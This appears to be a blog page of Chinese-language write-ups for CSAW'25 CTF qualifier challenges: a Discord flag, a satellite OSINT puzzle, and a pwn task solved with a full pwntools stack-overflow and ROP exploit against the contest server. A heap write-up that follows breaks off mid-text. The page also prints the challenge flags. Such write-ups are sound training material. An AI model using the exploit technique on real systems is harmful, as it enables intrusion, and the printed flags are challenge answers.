@@ -1,0 +1,625 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="Discord Information - Category: Misc - Points: 10 Description Join the Discord for our super secret flag! Write-up 本来以为是和机器人聊天，发现这机器人还挺难斥候，怀疑是真人。但凡我表现出任何索要 flag 的姿态他就不高兴了……最后发现 flag 在 #rules channel，严重怀疑是不是自己眼睛瞎了，还是当时脑子没完全开机，居然跑去和机器人聊天，然后这..."><meta name="robots" content="index,follow"><link rel="canonical" href="https://www.cubeyond.net/volume/1/csaw-25-quals/"><link rel="alternate" type="application/rss+xml" title="Entropic RSS" href="https://www.cubeyond.net/rss.xml"><meta property="og:site_name" content="Entropic"><meta property="og:title" content="Write-ups: CSAW'25 CTF Qualification Round :: Entropic"><meta property="og:description" content="Discord Information - Category: Misc - Points: 10 Description Join the Discord for our super secret flag! Write-up 本来以为是和机器人聊天，发现这机器人还挺难斥候，怀疑是真人。但凡我表现出任何索要 flag 的姿态他就不高兴了……最后发现 flag 在 #rules channel，严重怀疑是不是自己眼睛瞎了，还是当时脑子没完全开机，居然跑去和机器人聊天，然后这..."><meta property="og:type" content="article"><meta property="og:url" content="https://www.cubeyond.net/volume/1/csaw-25-quals/"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Write-ups: CSAW'25 CTF Qualification Round :: Entropic"><meta name="twitter:description" content="Discord Information - Category: Misc - Points: 10 Description Join the Discord for our super secret flag! Write-up 本来以为是和机器人聊天，发现这机器人还挺难斥候，怀疑是真人。但凡我表现出任何索要 flag 的姿态他就不高兴了……最后发现 flag 在 #rules channel，严重怀疑是不是自己眼睛瞎了，还是当时脑子没完全开机，居然跑去和机器人聊天，然后这..."><meta property="article:published_time" content="2025-09-13T00:00:00.000Z"><link rel="stylesheet" href="/_astro/global.CMXalTX5.css"><style>@font-face {
+  font-family: gohu;
+  src: url("/fonts/gohu-subset.woff") format("woff");
+  font-display: block;
+  font-style: normal;
+  font-weight: 400;
+}
+:root {
+  --bg: #0c0d10;
+  --home-bg: #0a0b11;
+  --fg: #fefefe;
+  --link: #93ffd7;
+  --link-hover: #c7ffe9;
+  --link-hover-bg: #153329;
+  --particle-home: #b47ae2;
+  --particle-home-glow: #6f4b97;
+  --particle-page: #9368b8;
+  --particle-page-glow: #52376f;
+  --particle-volume: #a878d2;
+  --particle-volume-glow: #68448c;
+  --text-font: gohu;
+  --text-size: 14px;
+  --cjk-size: 13px;
+  --cjk-link-size: 15px;
+  --text-cell: 8px;
+  --home-size: 14px;
+}</style><link rel="preload" href="/fonts/gohu-subset.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/assets/cjk/wqy-cjk-body.png" as="image"><link rel="preload" href="/assets/cjk/wqy-cjk-link.png" as="image"><title>Entropic</title></head> <body data-mobile-fit-breakpoint="760" data-particles-enabled="true">  <main class="screen">  <article class="textmode-wrap phile-wrap"> <header class="phile-header" style="--phile-header-lines: 17; --phile-meta-lines: 2; --phile-title-lines: 1"> <pre class="textmode-pre phile-pre phile-header-side life-art" data-life-root><span data-life-line data-row="0">┌───────────────────────┐</span>
+<span data-life-line data-row="1">│                       │</span>
+<span data-life-line data-row="2">│                       │</span>
+<span data-life-line data-row="3">│                       │</span>
+<span data-life-line data-row="4">│                       │</span>
+<span data-life-line data-row="5">│                       │</span>
+<span data-life-line data-row="6">│                       │</span>
+<span data-life-line data-row="7">│                       │</span>
+<span data-life-line data-row="8">│                       │</span>
+<span data-life-line data-row="9">│                       │</span>
+<span data-life-line data-row="10">│                       │</span>
+<span data-life-line data-row="11">│                       │</span>
+<span data-life-line data-row="12">│                       │</span>
+<span data-life-line data-row="13">│                       │</span>
+<span data-life-line data-row="14">│                       │</span>
+<span data-life-line data-row="15">│                       │</span>
+<span data-life-line data-row="16">└───────────────────────┘</span></pre> <pre class="textmode-pre phile-pre phile-header-meta">Write-ups: CSAW'25 CTF Qualification Round
+~ CuB3y0nd</pre> </header> <pre class="textmode-pre phile-pre phile-body-pre"># Discord
+
+## Information
+
+- Category: Misc
+- Points: 10
+
+## Description
+
+&gt; Join the Discord for our super secret flag!
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-480px">本</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-176px">和</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-208px">器</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-720px">聊</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-240px">天</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-208px">器</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-864px">还</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-416px">挺</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-912px">难</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-448px">斥</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-80px">候</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-336px">怀</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-624px">疑</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-640px">真</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-48px">但</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-112px">凡</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-784px">表</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-48px">任</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-64px">何</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-688px">索</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span>
+ flag <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-256px">姿</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-336px">态</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-48px">他</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-960px">高</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-96px">兴</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-464px">最</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span> flag <span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span> #rules channel<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-16px">严</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-880px">重</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-336px">怀</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-624px">疑</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-736px">自</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-288px">己</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-640px">眼</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-640px">睛</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-640px">瞎</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-864px">还</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-320px">当</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-448px">时</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-736px">脑</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-256px">子</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-256px">完</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-80px">全</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-320px">开</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-288px">居</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-832px">跑</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-144px">去</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-176px">和</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-208px">器</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-720px">聊</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-240px">天</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-208px">器</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-16px">也</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-592px">牛</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-880px">逼</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-800px">说</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-784px">要</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-640px">睡</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-784px">觉</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-32px">人</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-272px">家</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-672px">第</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-32px">二</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-240px">天</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-464px">晚</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-864px">还</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-16px">主</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-128px">动</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-384px">找</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-896px">问</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-880px">醒</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-704px">继</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-704px">续</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-720px">聊</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-192px">啊</span>……
+
+## Flag
+
+:spoiler[`csawctf{w3Ic0m3_70_th3_22nd_y34r_0f_CSAW}`]
+
+# Star Scream (Old)
+
+## Information
+
+- Category: OSINT
+- Points: 50
+
+## Description
+
+&gt; In 2017, a daring trio of tinkerers sent five midnight-black specks skyward. N
+o bigger than loaves of bread, yet destined to circle Earth 400km above the clou
+ds. Two of the tinkerers dreamt of showing their country's flags to the stars, b
+ut six weeks before my planned farewell, I tumbled back to the blue. Who am I?
+&gt;
+&gt; When you've sleuthed out the answer, submit: csawctf{Satelite-name_satcatnumbe
+r}
+
+## Write-up
+
+13 <span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-160px">号</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-32px">些</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-368px">戏</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-112px">剧</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-352px">性</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-32px">事</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-352px">情</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-512px">比</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-320px">延</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-480px">期</span> 24h <span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-304px">并</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-64px">修</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-432px">改</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-640px">目</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-368px">懒</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-336px">得</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-112px">删</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-800px">记</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-320px">录</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-448px">旧</span> flag……
+
+14 <span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-160px">号</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-448px">新</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span>……/<span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-384px">抓</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-592px">狂</span>
+
+### References
+
+- [Birds-1](https://en.wikipedia.org/wiki/Birds-1)
+- [GhanaSat-1](https://en.wikipedia.org/wiki/GhanaSat-1)
+
+## Flag
+
+:spoiler[`csawctf{GhanaSat-1_42821}`]
+
+# Mooneys Bookstore
+
+## Information
+
+- Category: Pwn
+- Points: 500
+
+## Description
+
+&gt; You think it's just input. Just another binary.
+&gt; But this stack? It's mine.
+&gt; Overflow it. Follow the trail. I left a key behind.
+&gt; If you're paying attention, you'll find it.
+&gt; Slip once, and the story ends before it begins.
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-688px">简</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-144px">单</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span>……<span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-240px">好</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-752px">菜</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-192px">啊</span> :sob:
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ROP,
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = &quot;./overflow_me&quot;
+HOST, PORT = &quot;chals.ctf.csaw.io&quot;, 21006
+
+context(log_level=&quot;debug&quot;, binary=FILE, terminal=&quot;kitty&quot;)
+
+elf = context.binary
+rop = ROP(elf)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    secret_addr = elf.bss() + 0x28
+    target.success(f&quot;secret addr: {hex(secret_addr)}&quot;)
+
+    target.sendafter(b&quot;Tell me its address&quot;, p64(secret_addr))
+    leak = target.recvlines(2)[1]
+    secret = int(leak, 16).to_bytes(0x8, &quot;little&quot;)
+    target.success(f&quot;leaked_addr: 0x{secret.hex()}&quot;)
+    target.sendafter(b&quot;the story unlocks&quot;, secret)
+
+    target.recvuntil(b&quot;for you: &quot;)
+    val = int(target.recvline().strip(), 16).to_bytes(0x8, &quot;little&quot;)
+    target.success(f&quot;val: 0x{val.hex()}&quot;)
+
+    # raw_input(&quot;DEBUG&quot;)
+    payload = flat(
+        b&quot;A&quot; * 64,
+        val,
+        b&quot;A&quot; * 0x10,
+        rop.ret.address,
+        elf.sym[&quot;get_flag&quot;],
+    )
+    target.sendlineafter(b&quot;into this story.&quot;, payload)
+
+    target.interactive()
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+```
+
+## Flag
+
+:spoiler[`csawctf{U_w3r3_n3v3r_m3@nt_2_s33_th3_st@ck~but_I_l3t_U_1n_b3c@us3_1_l0
+v3_U~d8K#xY_q1W9eVz2NpL7}`]
+
+# Power Up
+
+## Information
+
+- Category: Pwn
+- Points: 500
+
+## Description
+
+&gt; Your starship have been wandering for weeks in this derelict orbit, whose core
+ is out of energy.
+&gt; You are the last engineer who must ignite the core with energy using proper mo
+dules.
+&gt; Power up the starship. Or stay stranded forever.
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-224px">复</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:0px">下</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-512px">比</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-448px">时</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-80px">候</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-368px">成</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-128px">功</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-784px">解</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-96px">决</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-880px">里</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-48px">伪</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-912px">随</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-480px">机</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-896px">问</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-48px">但</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-608px">由</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-336px">怎</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-256px">学</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-848px">过</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-224px">堆</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-448px">方</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-640px">知</span><span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-800px">识</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-272px">导</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-736px">致</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-800px">认</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> unsorted bin attack<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-208px">场</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-256px">学</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-16px">习</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-624px">番</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-240px">始</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-704px">终</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-880px">遇</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-896px">问</span><span class="cjk 